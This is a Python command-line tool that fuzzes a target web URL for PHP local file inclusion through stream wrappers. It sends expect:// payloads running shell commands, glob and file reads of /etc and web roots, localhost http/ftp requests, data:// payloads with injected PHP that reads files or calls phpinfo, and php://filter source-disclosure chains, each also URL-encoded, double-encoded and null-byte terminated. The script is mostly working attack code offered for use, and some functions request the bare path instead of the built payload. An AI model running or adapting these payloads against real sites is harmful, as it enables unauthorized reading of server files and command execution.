import requests
import getopt
import sys
import common
import urllib3

urllib3.disable_warnings()

def help():
    print("\t-u URL, --url=URL\tscan url")
    print("\t-p, --path=      \tdir or file")
    print("\t--hcode=         \tHidden code separate [,]")
    print("\t--hsize=         \tHidden length content separate [,]")
    print("\t--htext=         \tHidden text separate [,]")
    print("\t-c, --cookie     \tset cookie separate [,]")
    print("EXAMPLES: ")    
    print("\twrappers_fuzz.py -u http://example.com -p test")
    print("\twrappers_fuzz.py --url=http://example.com --path=test")
    print("\twrappers_fuzz.py --url=http://example.com --path=test --hcode=404,502")
    print("\twrappers_fuzz.py --url=http://example.com --path=test --hsize=612")
    print("\twrappers_fuzz.py-u http://example.com -p test --cookie session=test,path=/")


def wrapper_expect_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
    cmds = ["ls", "pwd", "id", "whoami", "cd"]
    
    for cmd in cmds:
        expect_payloads = [f"expect://{cmd}", f"expect://{cmd}%00"]
        for payload in expect_payloads:
            resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
            # urlencode
            resp = requests.get(f"{url}{common.urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{common.urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            # double urlencode
            resp = requests.get(f"{url}{common.double_urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{common.double_urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))

   
def wrapper_glob_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
    dirs = ["/etc/", "/tmp/", "/var/www/html/"]

    for d in dirs:
        glob_paloads = [f"glob://*.*", f"glob://{d}*", f"glob://{d}*.*", f"glob://*.*", f"glob://{d}*%00", f"glob://{d}*.*%00"]
        for payload in glob_paloads:
            resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
            # urlencode
            resp = requests.get(f"{url}{common.urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{common.urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            # double urlencode
            resp = requests.get(f"{url}{common.double_urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{common.double_urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        

        
def wrapper_http_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
    schemes = ["http", "https"]    
    for addr in common.ADDR_LOCALHOST:
        for scheme in schemes:
            http_payloads = [f"{scheme}://{addr}/", f"{scheme}://{addr}/server-status", f"{scheme}://{addr}/%00", f"{scheme}://{addr}/server-status%00"]
            for payload in http_payloads:
                resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{url}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
                # urlencode
                resp = requests.get(f"{url}{common.urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}{common.urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                # double urlencode
                resp = requests.get(f"{url}{common.double_urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}{common.double_urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))



def wrapper_ftp_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=False): 
    for addr in common.ADDR_LOCALHOST:
        ftp_payloads = [f"ftp://{addr}/", f"ftp://{addr}/pub", f"ftp://{addr}/%00", f"ftp://{addr}/pub%00"]
        for payload in ftp_payloads:
            resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
            # urlencode
            resp = requests.get(f"{url}{common.urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{common.urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            # double urlencode
            resp = requests.get(f"{url}{common.double_urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{common.double_urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
       
    
    
def wrapper_file_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
    file_payloads = [f"file://{payload}", f"file://{payload}%00"]
    for p in file_payloads:
        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{url}{p} [code:{resp.status_code} size:{len(resp.content)}]"))
        # urlencode
        resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{url}{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{url}{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        # double urlencode
        resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{url}{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{url}{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))

    
def wrapper_data_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
    data_payloads = [f"data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>",
                     f"data://text/plain,<?php echo base64_encode(phpinfo()); ?>",
                     f"data://text/plain,<?php phpinfo(); ?>",
                     f"data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>%00",
                     f"data://text/plain,<?php echo base64_encode(phpinfo()); ?>%00",
                     f"data://text/plain,<?php phpinfo(); ?>%00"]
    for p in data_payloads:
        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
        # urlencode
        resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        # double urlencode
        resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))

    
def wrapper_compress_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
    compress_payloads = [f"compress.zlib://{payload}",
                         f"compress.bzip2://{payload}",
                         f"compress.zlib://{payload}%00",
                         f"compress.bzip2://{payload}%00",
                         f"zip://test.zip#/tmp/test.php",
                         f"zip://test.zip#/tmp/test.php%00",]
    for p in compress_payloads:
        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
        # urlencode
        resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        # double urlencode
        resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
    
    
def wrapper_php_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
    php_payloads = [f"php://filter/convert.base64-encode/resource={payload}",
                    f"php://filter/zlib.deflate/convert.base64-encode/resource={payload}",
                    f"php://filter/convert.quoted-printable-encode/resource={payload}",
                    f"php://filter/convert.iconv.utf-8.utf-16le/resource={payload}",
                    f"php://filter/read=string.toupper|string.rot13|string.tolower/resource={payload}",
                    f"php://filter/string.strip_tags/resource={payload}",
                    f"php://filter/string.toupper/string.rot13/string.tolower/resource={payload}",
                    f"php://filter/zlib.inflate/resource={payload}",
                    f"php://filter/convert.base64-encode/resource={payload}%00",
                    f"php://filter/zlib.deflate/convert.base64-encode/resource={payload}%00",
                    f"php://filter/convert.quoted-printable-encode/resource={payload}%00",
                    f"php://filter/convert.iconv.utf-8.utf-16le/resource={payload}%00",
                    f"php://filter/read=string.toupper|string.rot13|string.tolower/resource={payload}%00",
                    f"php://filter/string.strip_tags/resource={payload}%00",
                    f"php://filter/string.toupper/string.rot13/string.tolower/resource={payload}%00",
                    f"php://filter/zlib.inflate/resource={payload}%00"]

    for n in range(101):
        fd_payloads = [f"{url}php://fd/{n}", f"{url}php://fd/{n}%00"]
        for fd_p in fd_payloads:
            resp = requests.get(f"{url}{fd_p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{fd_p} [code:{resp.status_code} size:{len(resp.content)}]"))
            # urlencode
            resp = requests.get(f"{url}{common.urlencode(fd_p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.urlencode(fd_p)} [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{common.urlencode(fd_p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.urlencode(fd_p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            # double urlencode
            resp = requests.get(f"{url}{common.double_urlencode(fd_p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.double_urlencode(fd_p)} [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{common.double_urlencode(fd_p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{common.double_urlencode(fd_p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))

    for p in php_payloads:
        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
        # urlencode
        resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        # double urlencode
        resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))



def main():       
    url = None
    path = None
    cookie = None
    redirect = False
    hcode = ()
    hsize= ()
    htext = ()
    try:
        opts, args = getopt.getopt(sys.argv[1:], "u:p:c:r", ["url=", "path=", "cookie=", "hcode=", "hsize=", "htext=", "redirect="])
        for opt, arg in opts:            
            if opt in ("-u", "--url"):                    
                url = arg
            elif opt in ("-p", "--path"):                    
                path = arg
            elif opt in ("-c", "--cookie"):                    
                cookie = common.parse_cookie(arg)
            elif opt in ("-r", "--redirect"):                    
                redirect = True
            elif opt in ("--hcode"):                    
                hcode = tuple(map(int, arg.split(",")))
            elif opt in ("--hsize"):                    
                hsize = tuple(map(int, arg.split(",")))
            elif opt in ("--htext"):                    
                htext = tuple(map(str, arg.split(",")))
            else:
                help()
                sys.exit(0)
    except getopt.GetoptError as err:
        help()
        sys.exit(0)
    try:  
        if url is not None and path is not None:           
            url = common.parse_url(url)
            
            print("\n--------------------------")
            print("[!] Wrapper expect fuzzing")
            print("--------------------------\n")
            wrapper_expect_fuzz(url, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
            
            print("\n------------------------")
            print("[!] Wrapper glob fuzzing")
            print("------------------------\n")
            wrapper_glob_fuzz(url, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
            
            print("\n------------------------")
            print("[!] Wrapper http fuzzing")
            print("------------------------\n")
            wrapper_http_fuzz(url, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)

            print("\n------------------------")
            print("[!] Wrapper ftp fuzzing")
            print("------------------------\n")
            wrapper_ftp_fuzz(url, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)

            print("\n------------------------")
            print("[!] Wrapper file fuzzing")
            print("------------------------\n")
            wrapper_file_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)

            print("\n------------------------")
            print("[!] Wrapper data fuzzing")
            print("------------------------\n")
            wrapper_data_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)

            print("\n------------------------")
            print("[!] Wrapper compress fuzzing")
            print("------------------------\n")
            wrapper_compress_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)

            print("\n------------------------")
            print("[!] Wrapper php fuzzing")
            print("------------------------\n")
            wrapper_php_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
        else:
            help()
    except KeyboardInterrupt:
        sys.exit(0)
    except requests.ConnectionError as e:
        print(e)
    except requests.Timeout as e:
        print(e)
    except requests.RequestException as e:
        print(e)

if __name__ == "__main__":
    main()

